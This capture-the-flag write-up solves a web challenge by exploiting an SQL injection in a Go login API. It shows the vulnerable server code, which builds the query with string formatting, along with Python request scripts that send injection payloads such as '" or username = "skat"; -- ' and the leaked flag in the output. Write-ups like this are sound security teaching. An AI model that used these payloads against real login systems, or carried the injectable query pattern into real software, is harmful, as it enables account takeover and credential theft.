# What have we found here

## Provided Files
`Files.zip`

## Writeup

Starting off I took a look at the provided files. <br/>
```sql
CREATE DATABASE uwu;
use uwu;

CREATE TABLE IF NOT EXISTS users ( username text, password text );
INSERT INTO users ( username, password ) VALUES ( "root", "IamAvEryC0olRootUsr");
INSERT INTO users ( username, password ) VALUES ( "skat", "fakeflg{fake_flag}");
INSERT INTO users ( username, password ) VALUES ( "coded", "ilovegolang42");

CREATE USER 'readonly_user'@'%' IDENTIFIED BY 'password';
GRANT SELECT ON uwu.users TO 'readonly_user'@'%';
FLUSH PRIVILEGES;
```

Seems like this is the entry-point for the flag in form of a users password. <br/>
Knowing this I took a look at the service hosting the website and API endpoints. <br/>
```go
package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"regexp"
	"syscall"

	_ "github.com/go-sql-driver/mysql"
)

var DB *sql.DB
var Mux = http.NewServeMux()
var UsernameRegex = `[^a-z0-9]`

type Account struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

func startWeb() {
	fmt.Println("Starting very secure login panel (promise)")

	fs := http.FileServer(http.Dir("/home/user/web"))
	Mux.Handle("/", fs)

	Mux.HandleFunc("/api/login", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			w.WriteHeader(http.StatusMethodNotAllowed)
			return
		}

		var input Account

		decoder := json.NewDecoder(r.Body)
		decoder.Decode(&input)

		if input.Username == "" {
			w.WriteHeader(http.StatusBadRequest)
			w.Write([]byte("Missing Username"))
			return
		}
		if input.Password == "" {
			w.WriteHeader(http.StatusBadRequest)
			w.Write([]byte("Missing Password"))
			return
		}

		matched, err := regexp.MatchString(UsernameRegex, input.Username)
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}

		if matched {
			w.WriteHeader(http.StatusBadRequest)
			w.Write([]byte("Username can only contain lowercase letters and numbers."))
			return
		}

		qstring := fmt.Sprintf("SELECT * FROM users WHERE username = \"%s\" AND password = \"%s\"", input.Username, input.Password)

		query, err := DB.Query(qstring)
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			fmt.Println(err)
			return
		}
		defer query.Close()

		if !query.Next() {
			w.WriteHeader(http.StatusUnauthorized)
			w.Write([]byte("Invalid username / password combination!"))
			return
		}

		var result Account
		err = query.Scan(&result.Username, &result.Password)
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			fmt.Println(err)
			return
		}
		encoded, err := json.Marshal(result)
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			fmt.Println(err)
			return
		}

		w.Write(encoded)
	})

	http.ListenAndServe(":1337", Mux)
}

func main() {
	fmt.Println("Establishing connection to MySql")
	db, err := sql.Open("mysql", "readonly_user:password@tcp(127.0.0.1:3306)/uwu")
	if err != nil {
		fmt.Println(err)
		return
	}
	DB = db

	defer DB.Close()

	startWeb()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan
}
```

The important thing to notice here is the SQL-injection vulnerability. <br/>
```go
qstring := fmt.Sprintf("SELECT * FROM users WHERE username = \"%s\" AND password = \"%s\"", input.Username, input.Password)
```

Knowing this I took a look at the behavior of the endpoint, for this purpose I coded this small python script. <br/>
```py
import requests, json

url = "https://whats-my-password-web.chal.irisc.tf/api/login"

data = {
    "username": "root",
    "password": 'IamAvEryC0olRootUsr'
}

headers = {
    "Content-Type": "application/json"
}

response = requests.post(url, data=json.dumps(data), headers=headers)

print(response.text)
```

I used the credentials I found in the sql init file. <br/>
```sh
kali@kali python3 req.py
{"username":"root","password":"IamAvEryC0olRootUsr"}
```

Seems like we got our credentials back. <br/>
With this information I concluded that we need to use an SQL-injection to login as the user which has the flag as password. <br/>
```py
import requests, json

url = "https://whats-my-password-web.chal.irisc.tf/api/login"

data = {
    "username": "skat",
    "password": '" or 1=1; -- '
}

headers = {
    "Content-Type": "application/json"
}

response = requests.post(url, data=json.dumps(data), headers=headers)

print(response.text)
```

It seems that this worked but didn't get us the flag. <br/>
```sh
kali@kali python3 req.py
{"username":"root","password":"IamAvEryC0olRootUsr"}
```

Getting the credentials from user `root` back I concluded that if we use `" or 1=1; -- ` we retrieve all credentials stored and it only returns either the first or last of those credentials which in our case is user `root`. <br/>
Knowing this I changed the SQL-injection a bit. <br/>
```py
import requests, json

url = "https://whats-my-password-web.chal.irisc.tf/api/login"

data = {
    "username": "coded",
    "password": '" or username = "skat"; -- '
}

headers = {
    "Content-Type": "application/json"
}

response = requests.post(url, data=json.dumps(data), headers=headers)

print(response.text)
```

Using this I returned only user `skat` which obtains the flag and concludes this writeup. <br/>
```sh
kali@kali python3 req.py
{"username":"skat","password":"irisctf{my_p422W0RD_1S_SQl1}"}
```













